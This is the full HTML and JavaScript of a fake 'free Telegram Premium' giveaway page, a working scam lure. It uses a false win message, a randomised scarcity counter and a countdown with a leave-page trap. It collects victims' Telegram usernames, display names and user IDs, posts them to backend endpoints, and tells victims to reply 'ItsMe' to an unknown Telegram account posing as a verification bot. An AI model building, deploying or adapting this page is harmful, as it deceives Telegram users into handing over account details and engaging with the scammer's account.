<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium - Claim Your Free Subscription</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        @keyframes fly {
            0% { transform: translateX(-200px) rotate(-10deg) scale(0.8); opacity: 0; }
            20% { opacity: 1; }
            50% { transform: translateX(0) rotate(0deg) scale(1.2); }
            100% { transform: translateX(200px) rotate(10deg) scale(0.8); opacity: 0; }
        }
        @keyframes burst {
            0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
            50% { opacity: 1; }
            100% { transform: translate(-50%, -50%) translateY(-100px) scale(1.5); opacity: 0; }
        }
        @keyframes swing {
            0%, 100% { transform: rotate(-3deg); }
            50% { transform: rotate(3deg); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .animate-fadeIn { animation: fadeIn 0.6s ease-out; }
        .animate-float { animation: float 3s ease-in-out infinite; }
        .animate-fly { animation: fly 2s ease-in-out; }
        .animate-burst { animation: burst 1.5s ease-out forwards; }
        .animate-swing { animation: swing 1s ease-in-out infinite; }
        .animate-pulse-custom { animation: pulse 2s ease-in-out infinite; }
    </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 overflow-x-hidden">
    <!-- Transition Overlay -->
    <div id="transitionOverlay" class="hidden fixed inset-0 bg-gradient-to-br from-gray-900 to-gray-800 flex items-center justify-center z-50">
        <div id="transitionContent"></div>
    </div>

    <div class="container max-w-lg mx-auto p-5 min-h-screen flex items-center justify-center">
        <!-- Page 1: Congratulations -->
        <div id="page1" class="w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-fadeIn">
            <div class="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center text-5xl shadow-lg shadow-blue-500/40 animate-float">
                ‚úàÔ∏è
            </div>
            <div class="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 text-black px-5 py-2 rounded-full text-xs font-bold tracking-wider mb-5 shadow-lg shadow-yellow-500/40">
                PREMIUM ACCESS
            </div>
            <h1 class="text-4xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
                Congratulations!
            </h1>
            <p class="text-gray-400 text-lg mb-8">
                You've successfully decoded the comment and earned a FREE Telegram Premium subscription!
            </p>

            <div class="space-y-3 mb-8">
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">üî•</div>
                    <div class="text-gray-300 text-sm font-medium">Download files up to 4 GB</div>
                </div>
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">‚ö°</div>
                    <div class="text-gray-300 text-sm font-medium">Faster download speeds</div>
                </div>
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">üé®</div>
                    <div class="text-gray-300 text-sm font-medium">Exclusive stickers & reactions</div>
                </div>
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">üéôÔ∏è</div>
                    <div class="text-gray-300 text-sm font-medium">Voice-to-text conversion</div>
                </div>
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">üö´</div>
                    <div class="text-gray-300 text-sm font-medium">No ads forever</div>
                </div>
                <div class="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300">
                    <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">‚≠ê</div>
                    <div class="text-gray-300 text-sm font-medium">Unique badge & profile features</div>
                </div>
            </div>

            <button onclick="goToPage2()" class="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-5 rounded-2xl font-semibold text-lg shadow-lg shadow-blue-500/30 hover:shadow-blue-500/50 hover:-translate-y-1 transition-all duration-300 active:scale-95">
                Continue to Claim
            </button>
        </div>

        <!-- Page 2: Form -->
        <div id="page2" class="hidden w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-fadeIn">
            <div class="bg-gradient-to-r from-red-500 to-red-600 p-4 rounded-2xl text-center font-bold mb-6 shadow-lg shadow-red-500/40 animate-pulse-custom">
                ‚ö° Only <span id="spotCounter">2</span> Premium Spot<span id="spotPlural">s</span> Remaining ‚ö°
            </div>

            <div class="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center text-5xl shadow-lg shadow-blue-500/40">
                ü§ñ
            </div>
            <h1 class="text-3xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent text-center">
                Automated Delivery
            </h1>
            <p class="text-gray-400 text-center mb-8">
                Our AI-powered system will instantly verify and deliver your premium subscription
            </p>

            <div class="bg-blue-500/10 border border-blue-500/30 p-5 rounded-2xl mb-6">
                <div class="text-blue-400 font-semibold mb-3 flex items-center gap-2">
                    üì± How It Works
                </div>
                <div class="text-gray-400 text-sm leading-relaxed">
                    Enter your details below. Our automated bot will locate your account, send a verification DM, and activate your Telegram Premium within 60 seconds.
                </div>
            </div>

            <div class="space-y-5">
                <div>
                    <label class="block text-gray-300 font-semibold mb-2 text-sm">Telegram Username</label>
                    <input type="text" id="username" placeholder="@yourusername" class="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all">
                </div>

                <div>
                    <label class="block text-gray-300 font-semibold mb-2 text-sm">Display Name</label>
                    <input type="text" id="displayname" placeholder="Your Display Name" class="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all">
                </div>

                <div>
                    <label class="block text-gray-300 font-semibold mb-2 text-sm">Telegram User ID</label>
                    <input type="text" id="userid" placeholder="123456789" class="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all">
                </div>

                <button onclick="submitClaim()" class="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-5 rounded-2xl font-semibold text-lg shadow-lg shadow-blue-500/30 hover:shadow-blue-500/50 hover:-translate-y-1 transition-all duration-300 active:scale-95 mt-5">
                    Claim Premium Now
                </button>
            </div>
        </div>

        <!-- Page 3: Timer -->
        <div id="page3" class="hidden w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-fadeIn">
            <div class="bg-gradient-to-r from-red-500 to-red-600 text-white p-6 rounded-2xl mb-8 shadow-lg shadow-red-500/40 border-2 border-white/20">
                <div class="text-xl font-bold mb-3">‚ö†Ô∏è IMPORTANT - DO NOT CLOSE THIS PAGE</div>
                <div class="text-sm leading-relaxed">
                    Do NOT close or refresh this page. You will lose your opportunity and your spot will be given to someone else. Our fully automated system is processing your pre-ordered premium subscription.
                </div>
            </div>

            <div class="text-center">
                <div class="text-8xl mb-8 animate-swing">‚è∞</div>
                <h1 class="text-3xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
                    Automated Processing
                </h1>
                <p class="text-gray-400 mb-8">
                    Our AI system is activating your pre-ordered Telegram Premium from our reserve stock
                </p>

                <div id="timerDisplay" class="text-6xl font-bold text-blue-500 font-mono tracking-wider my-10" style="text-shadow: 0 0 30px rgba(42,171,238,0.5);">
                    02:00
                </div>

                <div class="bg-blue-500/10 border border-blue-500/30 p-5 rounded-2xl mb-6">
                    <div class="text-blue-400 font-semibold mb-3 flex items-center gap-2 justify-center">
                        ü§ñ Fully Automated System
                    </div>
                    <div class="text-gray-400 text-sm leading-relaxed">
                        We maintain a stock of pre-ordered premium subscriptions. Everything is automated - from account verification to premium delivery. Stay on this page while our system completes the process.
                    </div>
                </div>

                <div id="finalAlert" class="hidden bg-gradient-to-r from-yellow-400 to-orange-500 text-black p-6 rounded-2xl shadow-lg shadow-yellow-500/30 animate-fadeIn">
                    <div class="text-xl font-bold mb-4">üéâ Message Received!</div>
                    <div class="mb-3 text-sm">
                        You've received a message from an unknown Telegram ID. This is our automated verification bot.
                    </div>
                    <div class="mb-3 text-sm font-semibold">
                        CRITICAL STEP: Reply to that message with exactly:
                    </div>
                    <div class="bg-white/20 px-6 py-3 rounded-lg inline-block font-mono text-xl font-bold my-3">
                        ItsMe
                    </div>
                    <div class="bg-black text-yellow-400 p-4 rounded-xl font-semibold mt-4">
                        ‚ö†Ô∏è You MUST reply with "ItsMe" (case-sensitive) to verify your identity. Without this verification, the automated system cannot release your premium subscription.
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let timeLeft = 120;
        let timerInterval = null;
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

        function showTransition(type, callback) {
            const overlay = document.getElementById('transitionOverlay');
            const content = document.getElementById('transitionContent');
            
            overlay.classList.remove('hidden');
            
            if (type === 'plane') {
                content.innerHTML = '<div class="text-8xl animate-fly">‚úàÔ∏è</div>';
                setTimeout(callback, 1500);
            } else {
                content.innerHTML = `
                    <div class="relative w-40 h-40">
                        <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-7xl animate-pulse-custom">üéÅ</div>
                        <div class="absolute text-3xl animate-burst" style="top: 0; left: 50%; animation-delay: 0.3s;">‚ú®</div>
                        <div class="absolute text-3xl animate-burst" style="top: 33%; left: 50%; animation-delay: 0.35s;">‚≠ê</div>
                        <div class="absolute text-3xl animate-burst" style="top: 50%; left: 0; animation-delay: 0.4s;">‚ú®</div>
                        <div class="absolute text-3xl animate-burst" style="top: 50%; left: 33%; animation-delay: 0.45s;">‚≠ê</div>
                        <div class="absolute text-3xl animate-burst" style="top: 50%; left: 66%; animation-delay: 0.5s;">‚ú®</div>
                    </div>
                `;
                setTimeout(callback, 1000);
            }
            
            setTimeout(() => {
                overlay.classList.add('hidden');
            }, type === 'plane' ? 1500 : 1000);
        }

        function goToPage2() {
            showTransition('plane', () => {
                document.getElementById('page1').classList.add('hidden');
                document.getElementById('page2').classList.remove('hidden');
                const counter = Math.floor(Math.random() * 2) + 1;
                document.getElementById('spotCounter').textContent = counter;
                document.getElementById('spotPlural').textContent = counter > 1 ? 's' : '';
            });
        }

        async function submitClaim() {
            const username = document.getElementById('username').value;
            const displayname = document.getElementById('displayname').value;
            const userid = document.getElementById('userid').value;

            if (!username || !displayname || !userid) {
                alert('Please fill in all fields to claim your premium subscription.');
                return;
            }

            try {
                const response = await fetch('/api/submit-claim', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username,
                        displayname,
                        userid,
                        sessionId,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.ok) {
                    showTransition('gift', () => {
                        document.getElementById('page2').classList.add('hidden');
                        document.getElementById('page3').classList.remove('hidden');
                        setTimeout(startTimer, 2000);
                    });
                } else {
                    alert('Error submitting claim. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Network error. Please check your connection.');
            }
        }

        function startTimer() {
            timerInterval = setInterval(() => {
                timeLeft--;
                updateTimerDisplay();
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    showFinalAlert();
                }
            }, 1000);

            // Prevent page close
            window.onbeforeunload = function() {
                return 'Are you sure you want to leave? You will lose your premium spot!';
            };
        }

        function updateTimerDisplay() {
            const mins = Math.floor(timeLeft / 60);
            const secs = timeLeft % 60;
            document.getElementById('timerDisplay').textContent = 
                mins.toString().padStart(2, '0') + ':' + secs.toString().padStart(2, '0');
        }

        async function showFinalAlert() {
            document.getElementById('finalAlert').classList.remove('hidden');
            
            const username = document.getElementById('username').value;
            const displayname = document.getElementById('displayname').value;
            const userid = document.getElementById('userid').value;

            try {
                await fetch('/api/timer-complete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username,
                        displayname,
                        userid,
                        sessionId
                    })
                });
            } catch (error) {
                console.error('Error sending timer complete:', error);
            }
        }
    </script>
</body>
</html>
